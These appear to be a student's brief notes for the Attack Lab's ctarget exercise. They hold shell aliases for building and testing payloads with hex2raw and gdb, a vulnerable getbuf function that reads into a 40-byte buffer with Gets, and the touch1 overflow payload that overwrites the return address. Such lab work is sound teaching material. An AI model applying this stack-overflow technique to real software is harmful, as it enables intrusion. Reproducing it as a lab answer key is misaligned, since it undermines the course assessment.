[TOC]

alias mmk='gdb --args ./ctarget -q'

```bash
alias atkq='./hex2raw < ./exploits.txt > raw.txt; gdb -x cmds --args ./ctarget -q -i ./raw.txt'; alias py='python3 -c'

alias atkqr='./hex2raw < ./exploits.txt > raw.txt; ./ctarget -q -i ./raw.txt'; alias py='python3 -c'

alias submit='./hex2raw < ./exploits.txt > raw.txt; ./ctarget -i ./raw.txt'; alias py='python3 -c'
```

touch1:  0x00000000 00401f5d

```c
void getbuf() {
    char buf[0x28];    // 40
    Gets(buf);
    printf("You entered: %s\n", buf);
}
"de ad be ef"*10 + "5d 1f 40 00 00 00 00 00"
```
